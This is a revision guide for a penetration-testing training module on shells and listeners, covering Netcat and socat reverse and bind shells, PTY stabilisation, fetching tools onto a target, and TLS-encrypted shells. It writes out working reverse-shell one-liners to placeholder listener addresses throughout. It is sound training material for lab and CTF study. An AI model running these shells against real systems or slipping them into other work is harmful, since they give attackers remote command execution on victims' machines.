# 🐚 SHELLS & LISTENERS FUNDAMENTALS

> ** Revision Edition**\
> `UNDERSTAND → LISTEN → CONNECT → STABILISE → ENCRYPT`

> \[!CAUTION\] Organized from the supplied **Shells & Listeners
> Fundamentals** module for controlled labs, CTFs, and explicitly
> authorized testing.

------------------------------------------------------------------------

# 🗺️ Module Map

\| Section \| Topic \| Revision Focus \| \|\-\--\|\-\--\|\-\--\| \| 01
\| Introduction \| Local vs remote shells \| \| 02 \| Reverse vs Bind
Shells \| Connection direction \| \| 03 \| Tools for Remote Shells \|
Netcat, rlwrap, Socat, Metasploit \| \| 04 \| Working with Netcat \|
Listeners and key flags \| \| 05 \| Working with Socat \| Stable
cross-platform connections \| \| 06 \| Shell Stabilisation \| Python
PTY, rlwrap, Socat PTY \| \| 07 \| Encrypted Shells \| TLS with
Socat/OpenSSL \|

------------------------------------------------------------------------

# 01 --- Introduction

A **shell** is a command-line environment for interacting with an
operating system.

``` text
LOCAL SHELL
Your computer → bash / cmd.exe / PowerShell

REMOTE SHELL
Tester → network → authorized lab target
```

Initial remote shells may be non-interactive:

``` text
✗ No tab completion
✗ No command history
✗ Weak job control
✗ Ctrl+C may terminate the connection
✗ su/ssh may misbehave
✗ No proper TTY
```

## Learning Path

``` text
CATCH → USE → STABILISE → FULL TTY → ENCRYPT
```

------------------------------------------------------------------------

# 02 --- Reverse vs Bind Shells

## Reverse Shell

The **target initiates the connection** to the tester\'s listener.

``` text
TARGET ───────────────→ TESTER
                        LISTENER
```

### Listener

``` bash
nc -lvnp 4444
```

### Authorized Lab Target

``` bash
nc <LISTENER_IP> 4444 -e /bin/bash
```

## Bind Shell

The **target listens**, and the tester connects.

``` text
TESTER ───────────────→ TARGET
                        LISTENER
```

### Authorized Lab Target

``` bash
nc -lvnp 8080 -e /bin/bash
```

### Tester

``` bash
nc <TARGET_IP> 8080
```

## 🧠 Memory Trick

``` text
REVERSE = Target → You
BIND    = You → Target
```

\| Feature \| Reverse \| Bind \| \|\-\--\|\-\--\|\-\--\| \| Listener \|
Tester \| Target \| \| Initiator \| Target \| Tester \| \| Often useful
when \| Outbound allowed \| Inbound target port reachable \| \|
Commonness \| More common \| Less common \|

------------------------------------------------------------------------

# 03 --- Tools for Remote Shells

``` text
NETCAT
   ↓
Quick/basic connection
   ↓
RLWRAP
   ↓
Better line editing/history
   ↓
SOCAT
   ↓
PTY + richer connection handling
   ↓
MSFVENOM + MULTI/HANDLER
   ↓
Metasploit payload/session workflow
```

## Netcat

``` text
✓ Lightweight
✓ Simple
✓ Fast
✗ No built-in encryption
✗ Limited interactivity
```

## rlwrap

Adds readline-style usability around programs such as Netcat:

``` text
✓ Command history
✓ Arrow-key navigation
✓ Better line editing
```

## Socat

Important capabilities highlighted by the module:

``` text
✓ TCP connections
✓ PTY allocation
✓ Signal handling
✓ Job control
✓ SSL/TLS support
✓ Linux/Windows patterns
```

## Msfvenom + multi/handler

``` text
MSFVENOM → Generate compatible payload
MULTI/HANDLER → Listen/manage compatible session
```

------------------------------------------------------------------------

# 04 --- Working with Netcat

## Key Listener Flags

``` text
-l → Listen
-v → Verbose
-n → Skip DNS lookup
-p → Port
```

### ⚡ Listener

``` bash
nc -lvnp 4444
```

## Reverse Shell Lab Pattern

### Tester

``` bash
nc -lvnp 4444
```

### Authorized Linux Lab Target

``` bash
nc <LISTENER_IP> 4444 -e /bin/bash
```

### Simple Verification

``` bash
whoami
hostname
pwd
```

> \[!NOTE\] Some Netcat variants do not support `-e`.

## Bind Shell Lab Pattern

### Authorized Target

``` bash
nc -lvnp 8080 -e /bin/bash
```

### Tester

``` bash
nc <TARGET_IP> 8080
```

## Netcat vs Ncat

\| Tool \| Description \| \|\-\--\|\-\--\| \| `nc` \| Traditional
lightweight Netcat \| \| `ncat` \| Nmap implementation with additional
features \|

Useful help:

``` bash
nc -h
ncat --help
man nc
```

Other flags mentioned:

``` text
-u → UDP
-w → timeout
-q → wait after EOF before closing
```

------------------------------------------------------------------------

# 05 --- Working with Socat

## Core Syntax

``` text
socat [options] ADDRESS1 ADDRESS2
```

## Linux Reverse Shell Lab Pattern

### Tester

``` bash
socat TCP-L:443 -
```

### Authorized Target

``` bash
socat TCP:<LISTENER_IP>:443 EXEC:"bash -li"
```

## Windows Pattern

``` powershell
socat TCP:<LISTENER_IP>:443 EXEC:powershell.exe,pipes
```

or:

``` text
EXEC:cmd.exe,pipes
```

## Socat Bind Shell

### Authorized Linux Target

``` bash
socat TCP-L:8088 EXEC:"bash -li"
```

### Tester

``` bash
socat TCP:<TARGET_IP>:8088 -
```

### Windows Pattern

``` powershell
socat TCP-L:8088 EXEC:cmd.exe,pipes
```

------------------------------------------------------------------------

# 06 --- Shell Stabilisation

``` text
RAW SHELL
   ↓
PTY
   ↓
TERM
   ↓
LOCAL TERMINAL SETTINGS
   ↓
TERMINAL SIZE
   ↓
STABLE INTERACTIVE SHELL
```

The module covers:

``` text
1. Python PTY
2. rlwrap
3. Socat PTY
```

## Python PTY

### 1. Record Local Terminal Size

``` bash
stty size
```

Example:

``` text
50 220
```

### 2. Spawn PTY

``` bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 3. Set Terminal Type

``` bash
export TERM=xterm
```

### 4. Suspend

``` text
Ctrl+Z
```

### 5. Configure Local Terminal

``` bash
stty raw -echo
```

### 6. Resume

``` bash
fg
```

### 7. Apply Terminal Dimensions

``` bash
stty rows 50 cols 220
```

Use the values from your own `stty size`.

### Restore Local Terminal

``` bash
stty sane
```

If needed after an unexpected disconnect:

``` bash
reset
```

------------------------------------------------------------------------

# 07 --- rlwrap

Wrap the listener:

``` bash
rlwrap nc -lvnp 4444
```

Concept:

``` text
NETCAT
   +
RLWRAP
   =
Better command-line usability
```

The module then applies the same Python PTY stabilisation workflow.

------------------------------------------------------------------------

# 08 --- Fully Interactive Socat PTY

## Tester

``` bash
socat TCP-L:5555 FILE:`tty`,raw,echo=0
```

## Authorized Linux Target

``` bash
socat TCP:<LISTENER_IP>:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

\| Option \| Purpose \| \|\-\--\|\-\--\| \| `pty` \| Allocate
pseudo-terminal \| \| `stderr` \| Forward errors \| \| `sigint` \|
Ctrl+C handling \| \| `setsid` \| New session/job control \| \| `sane`
\| Standard terminal settings \|

------------------------------------------------------------------------

# 09 --- Lab File Transfer for Socat

## Tester HTTP Server

``` bash
python3 -m http.server 80
```

## Authorized Linux Lab Target

``` bash
wget http://<LISTENER_IP>/socat -O /tmp/socat
chmod +x /tmp/socat
```

## Authorized Windows Lab Target

``` powershell
Invoke-WebRequest -Uri http://<LISTENER_IP>/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

------------------------------------------------------------------------

# 10 --- Encrypted Shells

The module introduces SSL/TLS wrapping with Socat.

``` text
SHELL DATA
    ↓
TLS
    ↓
ENCRYPTED IN TRANSIT
```

## Generate Self-Signed Lab Certificate

``` bash
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key \
-x509 -days 365 \
-out shell.crt
```

## Combine Certificate + Key

``` bash
cat shell.key shell.crt > shell.pem
```

``` text
shell.key → private key
shell.crt → certificate
shell.pem → combined PEM
```

------------------------------------------------------------------------

# 11 --- Encrypted Reverse Shell Lab Pattern

## Tester

``` bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

## Authorized Linux Target

``` bash
socat OPENSSL:<LISTENER_IP>:443,verify=0 EXEC:/bin/bash
```

## Windows Pattern

``` powershell
socat OPENSSL:<LISTENER_IP>:443,verify=0 EXEC:powershell.exe,pipes
```

------------------------------------------------------------------------

# 12 --- Encrypted Bind Shell Lab Pattern

## Authorized Linux Target

``` bash
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
```

## Tester

``` bash
socat OPENSSL:<TARGET_IP>:8443,verify=0 -
```

------------------------------------------------------------------------

# 13 --- Encrypted TTY

## Tester

``` bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 \
FILE:`tty`,raw,echo=0
```

## Authorized Linux Target

``` bash
socat OPENSSL:<LISTENER_IP>:443,verify=0 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

``` text
SOCAT + PTY + TLS
       ↓
Interactive encrypted connection
```

------------------------------------------------------------------------

# 14 --- SSL Troubleshooting

Check Socat features:

``` bash
socat -V
```

Checklist:

``` text
[ ] OpenSSL support available?
[ ] Certificate exists?
[ ] Correct certificate path?
[ ] Correct file permissions?
[ ] Both endpoints configured consistently?
```

The training example uses `verify=0` with its self-signed lab
certificate.

------------------------------------------------------------------------

# ⚡ MASTER COMMAND CHEAT SHEET

## Netcat

``` bash
nc -lvnp 4444
nc <IP> <PORT>
rlwrap nc -lvnp 4444
```

## Verification

``` bash
whoami
hostname
pwd
id
```

## Python PTY

``` bash
stty size
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Then:

``` text
Ctrl+Z
```

``` bash
stty raw -echo
fg
stty rows <ROWS> cols <COLS>
```

Restore:

``` bash
stty sane
```

## Socat

``` bash
socat TCP-L:443 -
socat TCP:<IP>:443 -
```

## Socat PTY

``` bash
socat TCP-L:5555 FILE:`tty`,raw,echo=0
```

``` bash
socat TCP:<IP>:5555 \
EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## Certificate

``` bash
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key -x509 -days 365 -out shell.crt

cat shell.key shell.crt > shell.pem
```

## Encrypted Socat

``` bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

``` bash
socat OPENSSL:<IP>:443,verify=0 EXEC:/bin/bash
```

------------------------------------------------------------------------

# 🧠 30-Second Revision Map

``` text
             REMOTE SHELL
                  │
        ┌─────────┴─────────┐
        │                   │
     REVERSE              BIND
        │                   │
  Target → Tester      Tester → Target
        │                   │
        └─────────┬─────────┘
                  ▼
               NETCAT
                  │
                  ▼
               RLWRAP
                  │
                  ▼
             PYTHON PTY
                  │
                  ▼
                SOCAT
                  │
                  ▼
              SOCAT PTY
                  │
                  ▼
            SOCAT + TLS
```

# ⭐ Fast Memory Table

\| Need \| Remember \| \|\-\--\|\-\--\| \| Quick listener \|
`nc -lvnp <port>` \| \| Better Netcat usability \|
`rlwrap nc -lvnp <port>` \| \| Linux PTY \|
`python3 -c 'import pty; pty.spawn("/bin/bash")'` \| \| Terminal type \|
`export TERM=xterm` \| \| Local raw mode \| `stty raw -echo` \| \|
Restore terminal \| `stty sane` \| \| Socat listener \|
`socat TCP-L:<port> -` \| \| Socat PTY options \|
`pty,stderr,sigint,setsid,sane` \| \| TLS listener \| `OPENSSL-LISTEN`
\| \| TLS connection \| `OPENSSL` \|

------------------------------------------------------------------------

# 🏁 My Cyber Journey Progress

``` text
RECONNAISSANCE
      ↓
SCANNING
      ↓
VULNERABILITY IDENTIFICATION
      ↓
EXPLOITATION
      ↓
METERPRETER / POST-EXPLOITATION
      ↓
MSFVENOM / PAYLOAD GENERATION
      ↓
EXPLOITATION & WEAPONISATION
      ↓
SHELLS & LISTENERS FUNDAMENTALS
      ↓
REMOTE SHELL STABILISATION
```

## Core Takeaways

**Reverse shell:** target initiates the connection to the tester.

**Bind shell:** target listens and the tester connects.

**Netcat:** quick basic connectivity.

**rlwrap:** improves command-line usability.

**Python PTY:** upgrades a limited Linux shell.

**Socat:** richer connection and PTY handling.

**Encrypted Socat:** TLS encryption for the connection.

**Shell stabilisation:** turns a brittle shell into a more usable
terminal.
